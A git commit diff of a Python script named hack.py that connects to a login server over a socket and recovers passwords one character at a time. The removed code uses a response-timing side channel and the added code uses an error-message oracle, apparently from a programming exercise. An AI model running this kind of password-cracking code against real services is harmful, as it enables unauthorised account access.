7b89afec60e01bfd37d1e9e05f656a3d6adcd393
Konstantin <mr.kkaminsky@list.ru>
2021-02-13 14:34:57 +0500

    test

--- hack.py
+++ hack.py
@@ -1,35 +1,26 @@
 import sys
 import socket
 import string
+import itertools
 import json
-from datetime import datetime
 
 
 def get_pass(login, letters=""):
     alpha = string.ascii_letters + string.digits
-    differences = []
-    exit_flag = False
-    result = ''
     for ch in alpha:
         json_string1 = json.dumps({"login": login, "password": letters + ch})
-        start = datetime.now()
         client_socket.send(json_string1.encode())
-        response1 = client_socket.recv(1024)
-        finish = datetime.now()
+        response1 = client_socket.recv(2048)
         response1 = response1.decode()
         decoded_data1 = json.loads(response1)
-        difference = finish - start
-        if decoded_data1["result"] == "Connection success!":
-            exit_flag = True
-            result = json_string1
-            break
-        differences.append((difference, ch))
-    max_diff = max(differences)
-    if not exit_flag:
-        return get_pass(login, letters + max_diff[1])
-    else:
-        return result
-
+        if decoded_data1["result"] == "Exception happened during login":
+            return get_pass(login, letters + ch)
+        elif decoded_data1["result"] == "Wrong password!":
+            continue
+        elif decoded_data1["result"] == "Connection success!":
+            return json_string1
+        else:
+            return "Something wrong"
 
 
 args = sys.argv
@@ -45,7 +36,6 @@ client_socket.connect(address)
 
 file = open("logins.txt", "r")
 logins = file.read().splitlines()
-
 file.close()
 
 for login in logins:
